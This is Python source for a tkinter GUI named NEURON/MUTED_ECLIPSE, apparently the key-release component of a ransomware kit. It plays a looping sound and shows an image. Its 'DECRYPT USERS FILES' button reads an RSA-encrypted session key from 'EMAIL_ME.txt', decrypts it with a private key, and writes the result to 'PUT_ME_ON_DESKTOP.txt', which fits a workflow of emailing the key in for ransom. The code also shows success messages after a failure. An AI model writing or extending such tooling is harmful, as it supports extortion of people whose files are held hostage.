import tkinter as tk
import winsound
from tkinter import *

from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from PIL import Image, ImageTk


class App(tk.Tk):
    """GUI Class"""

    def __init__(self):
        super().__init__()
        self.configure(bg="#2e3440")
        # self.geometry('459x750')
        self.resizable(0, 0)
        self.title("MUTED_ECLIPSE")
        self.iconbitmap("crypt.ico")

        # UI options
        entry_font = {"font": ("Helvetica", 13)}

        # configure the grid
        self.columnconfigure(0, weight=1)
        self.columnconfigure(1, weight=3)

        # username = tk.StringVar()
        # password = tk.StringVar()

        # Begins our funky tunes
        winsound.PlaySound("song.wav", winsound.SND_ALIAS | winsound.SND_ASYNC | winsound.SND_LOOP)

        # Imports our image in
        load = Image.open("image.jpg")
        render = ImageTk.PhotoImage(load)
        img = Label(self, image=render, borderwidth=0, highlightthickness=0)
        img.image = render
        img.grid(column=0, row=0, sticky=tk.N)

        # heading
        heading = tk.Label(
            self,
            text="NEURON v1.0.1 [MUTED_ECLIPSE]",
            font=("Helvetica", 13),
            background="#2e3440",
            foreground="white",
        )
        heading.grid(column=0, row=1, columnspan=2, pady=5, sticky=tk.N)

        # Gen button
        login_button = tk.Button(
            self,
            text="DECRYPT USERS FILES",
            font=("Helvetica", 13),
            activebackground="#4c566a",
            activeforeground="white",
            background="#2e3440",
            foreground="white",
            command=lambda: self.gen_rsa(),
        )
        login_button.grid(column=0, row=3, sticky=tk.N, padx=5, pady=5)

    def gen_rsa(self):
        gen_label = tk.Label(
            self,
            background="#2e3440",
            font=("Helvetica", 13),
            foreground="white",
            text="[~] NEURON >> Attempting to decrypt...",
        )
        gen_label.grid(column=0, row=4, sticky=tk.W)

        try:
            with open("EMAIL_ME.txt", "rb") as f:
                enc_fernet_key = f.read()
                print(enc_fernet_key)

                # Private RSA key
                private_key = RSA.import_key(open("private.pem").read())

                # Private decrypter
                private_crypter = PKCS1_OAEP.new(private_key)

                # Decrypted session key
                dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
                with open("PUT_ME_ON_DESKTOP.txt", "wb") as f:
                    f.write(dec_fernet_key)
            """
            print(f'> Private key: {private_key}')
            print(f'> Private decrypter: {private_crypter}')
            print(f'> Decrypted fernet key: {dec_fernet_key}')
            print('> Decryption Completed')
            """
        except IOError:
            gen2_label = tk.Label(
                self,
                background="#2e3440",
                font=("Helvetica", 13),
                foreground="white",
                text="[!!!] CRYPTWALKER >> File 'EMAIL_ME.txt' was not found",
            )
            gen2_label.grid(column=0, row=5, sticky=tk.W)
        finally:
            f.close()

        gen2_label = tk.Label(
            self,
            background="#2e3440",
            font=("Helvetica", 13),
            foreground="white",
            text="[~] CRYPTWALKER >> File decrypted, saving to 'PUT_ME_ON_DESKTOP.txt",
        )
        gen2_label.grid(column=0, row=5, sticky=tk.W)

        gen3_label = tk.Label(
            self, background="#2e3440", font=("Helvetica", 13), foreground="white", text="[~] CRYPTWALKER >> Done! :)"
        )
        gen3_label.grid(column=0, row=6, sticky=tk.W)


def main():
    app = App()
    app.mainloop()

if __name__ == "__main__":
    main()
